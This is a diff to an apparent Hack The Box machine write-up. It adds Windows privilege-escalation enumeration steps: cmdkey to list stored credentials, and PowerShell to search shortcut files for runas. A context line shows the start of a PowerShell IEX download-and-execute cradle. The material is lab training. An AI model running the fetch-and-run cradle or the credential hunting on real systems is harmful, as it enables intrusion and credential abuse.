@@ -189,8 +189,17 @@ C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadStri
 
 
 ## Stored Windows Credentials
+  - Check if any stored credentials exist.
 ```CSS
 PS C:\Users\security\Desktop> cmdkey /list
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/cec4e58e-8623-4069-8037-e537471d27ef)
 
+The commands below are used to enumerate all the accessible shortcut (.lnk) files on the system, and examine them for the presence of the "runas" command.
+```CSS
+C:\Users\security\Desktop> Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
+```
+```CSS
+C:\Users\security\Desktop> ForEach($file in gc .\shortcuts.txt) {Write-Output $file; gc $file | Select-String runas}
+```
+The commands is used to enumerate all the accessible shortcut (.lnk) files on the system, and examine them for the presence of the "runas" command.
